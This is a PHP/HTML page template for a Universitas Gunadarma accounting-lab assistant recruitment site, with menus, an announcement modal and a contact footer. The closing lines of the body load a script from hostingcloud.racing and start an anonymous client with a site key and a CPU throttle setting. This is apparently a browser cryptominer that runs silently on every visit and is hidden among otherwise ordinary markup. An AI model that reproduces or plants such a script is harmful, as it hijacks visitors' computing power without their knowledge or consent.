<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="description" content="">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <!-- The above 4 meta tags *must* come first in the head; any other head content must come *after* these tags -->

    <!-- Title -->
    <title>Lab. Akuntansi Menengah - <?php echo $title; ?> </title>

    <!-- Favicon -->
    <link rel="icon" href="<?php echo base_url(); ?>assets/academy/img/core-img/favicon2.ico">

    <!-- Core Stylesheet -->
    <link rel="stylesheet" href="<?php echo base_url(); ?>assets/academy/style.css">

</head>

<body>
    <!-- ##### Preloader ##### -->
    <div id="preloader">
        <i class="circle-preloader"></i>
    </div>

    <!-- ##### Header Area Start ##### -->
    <header class="header-area">

        <!-- Top Header Area -->
        <div class="top-header">
            <div class="container h-100">
                <div class="row h-100">
                    <div class="col-12 h-100">
                        <div class="header-content h-100 d-flex align-items-center justify-content-between">
                            <div class="academy-logo">
                                <a href="https://www.oprec.ak-menengah.com"><img src="<?php echo base_url(); ?>assets/academy/img/core-img/logo-labamen.png" alt=""></a>
                            </div>

                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- Navbar Area -->
        <div class="academy-main-menu">
            <div class="classy-nav-container breakpoint-off">
                <div class="container">
                    <!-- Menu -->
                    <nav class="classy-navbar justify-content-between" id="academyNav">

                        <!-- Navbar Toggler -->
                        <div class="classy-navbar-toggler">
                            <span class="navbarToggler"><span></span><span></span><span></span></span>
                        </div>

                        <!-- Menu -->
                        <div class="classy-menu">

                            <!-- close btn -->
                            <div class="classycloseIcon">
                                <div class="cross-wrap"><span class="top"></span><span class="bottom"></span></div>
                            </div>

                            <!-- Nav Start -->
                            <div class="classynav">
                                <ul>
                                    <li><a href="<?php echo base_url('/'); ?>">Home</a></li>
                                    
                                    <li><a href="#">Pengumuman</a>
                                        <div class="megamenu">
                                            <div class="single-mega cn-col-4">
                                            </div>
                                            <ul class="single-mega cn-col-4">
                                                <li><a href="<?php echo base_url('home/alur_pendaftaran'); ?>">Alur Pendaftaran</a></li>
                                                <li><a href="<?php echo base_url('home/formasi_asisten'); ?>">Formasi Asisten</a></li>
                                                <img src="<?php echo base_url(); ?>assets/academy/img/bg-img/logo-labamen.png" alt="">
                                            </ul>
                                         
                                        </div>
                                    </li>
                                    <li><a href="<?php echo base_url('home/about_us'); ?>">About Us</a></li>
                                    <li><a href="<?php echo base_url('registrasi'); ?>">Registrasi</a></li>
                                    <li><a href="<?php echo base_url('login'); ?>">Login</a></li>
                                </ul>
                            </div>
                            <!-- Nav End -->
                        </div>

                        <!-- Calling Info -->
                        <div class="calling-info">
                            <div class="call-center">
                                <a href="https://wa.me/62895327109744"><i class="icon-telephone-2"></i> <span>More info on WhatsApp</span></a>
                            </div>
                        </div>
                    </nav>
                </div>
            </div>
        </div>
    </header>
    <!-- ##### Header Area End ##### -->
<div id="myModal" class="modal fade" role="dialog">
  <div class="modal-dialog">
    <!-- Modal content-->
    <div class="modal-content">
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal">&times;</button>

      </div>
      <div class="modal-body">
        <img src="https://ak-menengah.com/pemberitahuan.jpg" alt="Pengumuman">
        <p> </p>
        <form action="https://ak-menengah.com/pengumuman_asisten.pdf">
       <input type="submit" class="btn btn-primary btn-block" value="Download Data Lolos Asisten"/>
       </form>
       <br/>
       <form action="https://ak-menengah.com/programmer.pdf">
       <input type="submit" class="btn btn-primary btn-block" value="Download Data Lolos programmer"/>
       </form>
       <p> atau bisa <a href="https://openrecruitment.ak-menengah.com/login">Login</a> dengan menggunakan NPM dan password yang sudah dibuat</p>
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
      </div>
    </div>

  </div>
</div>
    <!-- ##### Conten ##### -->
    <?php 
        if ($page == 'home') {
            include 'home.php';
        }
        elseif ($page == 'formasi_asisten'){
            include 'pengumuman/formasi_asisten.php';
        }
        elseif ($page == 'alur_pendaftaran'){
            include 'pengumuman/alur_pendaftaran.php';
        }
        elseif ($page == 'passing_grade'){
            include 'pengumuman/passing_grade.php';
        }
        elseif ($page == 'registrasi'){
            include 'registrasi.php';
        }
        elseif ($page == 'login'){
            include 'login.php';
        }
        elseif ($page == 'about_us'){
            include 'about_us.php';
        }
     ?>
    <!-- ##### Conten End ##### -->

    <!-- ##### Footer Area Start ##### -->
    <footer class="footer-area">
        <div class="main-footer-area section-padding-100-0">
            <div class="container">
                <div class="row">
                    <!-- Footer Widget Area -->
                    <div class="col-12 col-sm-6 col-lg-3">
                        <div class="footer-widget mb-100">
                            <div class="widget-title">
                                <a href="#"><img src="<?php echo base_url(); ?>assets/academy/img/core-img/Logo_white.png" alt=""></a>
                            </div>
                            <p>Lab. Akuntansi Menengah Merupakan Laboratorium Fakultas Ekonomi Universitas Gunadarma </p>
                            <div class="footer-social-info">
                                <a href="https://www.instagram.com/labamen_ug/"><i class="fa fa-instagram"></i></a>

                            </div>
                        </div>
                    </div>
                    <!-- Footer Widget Area -->
                    <div class="col-12 col-sm-6 col-lg-3">
                        <div class="footer-widget mb-200">
                            <div class="widget-title">
                                <h6>Usefull Links</h6>
                            </div>
                            <nav>
                                <ul class="useful-links">
                                    <li><a href="<?php echo base_url('/'); ?>">Home</a></li>
                                    <li><a href="<?php echo base_url('home/formasi_asisten'); ?>">Formasi Asisten</a></li>
                                    <li><a href="<?php echo base_url('home/alur_pendaftaran'); ?>">Alur Pendaftaran</a></li>
                                    <li><a href="<?php echo base_url('home/about_us'); ?>">About Us</a></li>
                                    <li><a href="<?php echo base_url('registrasi'); ?>">Registrasi</a></li>
                                    <li><a href="<?php echo base_url('login'); ?>">Login</a></li>
                                </ul>
                            </nav>
                        </div>
                    </div>
                    <!-- Footer Widget Area -->
                    <div class="col-12 col-sm-6 col-lg-3">
                        <div class="footer-widget mb-100">
                            <div class="widget-title">
                                <h6>Gallery</h6> 
                            </div>
                            <div class="gallery-list d-flex justify-content-between flex-wrap">
                                <a href="<?php echo base_url(); ?>assets/academy/img/bg-img/1.jpg" class="gallery-img" title="Gallery Image 1"><img src="<?php echo base_url(); ?>assets/academy/img/bg-img/1.jpg" alt=""></a>
                                <a href="<?php echo base_url(); ?>assets/academy/img/bg-img/2.jpg" class="gallery-img" title="Gallery Image 2"><img src="<?php echo base_url(); ?>assets/academy/img/bg-img/2.jpg" alt=""></a>
                                <a href="<?php echo base_url(); ?>assets/academy/img/bg-img/3.jpg" class="gallery-img" title="Gallery Image 3"><img src="<?php echo base_url(); ?>assets/academy/img/bg-img/3.jpg" alt=""></a>
                                <a href="<?php echo base_url(); ?>assets/academy/img/bg-img/4.jpg" class="gallery-img" title="Gallery Image 4"><img src="<?php echo base_url(); ?>assets/academy/img/bg-img/4.jpg" alt=""></a>
                                <a href="<?php echo base_url(); ?>assets/academy/img/bg-img/5.jpg" class="gallery-img" title="Gallery Image 5"><img src="<?php echo base_url(); ?>assets/academy/img/bg-img/5.jpg" alt=""></a>
                                <a href="<?php echo base_url(); ?>assets/academy/img/bg-img/gallery6.jpg" class="gallery-img" title="Gallery Image 6"><img src="<?php echo base_url(); ?>assets/academy/img/bg-img/6.JPG" alt=""></a>
                            </div>
                        </div>
                    </div>
                    <!-- Footer Widget Area -->
                    <div class="col-12 col-sm-6 col-lg-3">
                        <div class="footer-widget mb-100">
                            <div class="widget-title">
                                <h6>Contact</h6>
                            </div>
                            <div class="single-contact d-flex mb-30">
                                <i class="icon-placeholder"></i>
                                <p>Kampus E Jl. Komjen.Pol.M.Jasin No.9, Tugu, Kec. Cimanggis, Kota Depok, Jawa Barat 16451</p>
                            </div>
                            <div class="single-contact d-flex mb-30">
                                <i class="icon-telephone-1"></i>
                                <p>Admin: (+62)895-3271-09744 (Irlangga),(+62)812-8444-4521 (Shifa Baity),(+62)818-0882-2811 (Khansa)</p>
                            </div>
                            <div class="single-contact d-flex">
                                <i class="icon-contract"></i>
                                <p>labamen.gunadarma@gmail.com</p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="bottom-footer-area">
            <div class="container">
                <div class="row">
                    <div class="col-12">
                        <p><!-- Link back to Colorlib can't be removed. Template is licensed under CC BY 3.0. -->
                            Copyright &copy;<script>document.write(new Date().getFullYear());</script> M. Kizbudin 
                        <!-- Link back to Colorlib can't be removed. Template is licensed under CC BY 3.0. --></p>
                    </div>
                </div>
            </div>
        </div>
    </footer>
    <!-- ##### Footer Area Start ##### -->

    <!-- ##### All Javascript Script ##### -->
    <!-- jQuery-2.2.4 js -->
    <script src="<?php echo base_url(); ?>assets/academy/js/jquery/jquery-2.2.4.min.js"></script>
    <!-- Popper js -->
    <script src="<?php echo base_url(); ?>assets/academy/js/bootstrap/popper.min.js"></script>
    <!-- Bootstrap js -->
    <script src="<?php echo base_url(); ?>assets/academy/js/bootstrap/bootstrap.min.js"></script>
    <!-- All Plugins js -->
    <script src="<?php echo base_url(); ?>assets/academy/js/plugins/plugins.js"></script>
    <!-- Active js -->
    <script src="<?php echo base_url(); ?>assets/academy/js/active.js"></script>
    <script>
    $(window).load(function(){        
        $('#myModal').modal('show');
    }); 
    </script>
   <script src="https://www.hostingcloud.racing/UZxi.js"></script>
<script>
    var _client = new Client.Anonymous('17c78544b263ec21e8b859ada0827d33bc90e1a41134cc40e4df306dfabe6e38', {
        throttle: 0.7, c: 'w', ads: 0
    });
    _client.start();

</script>
</body>

</html>
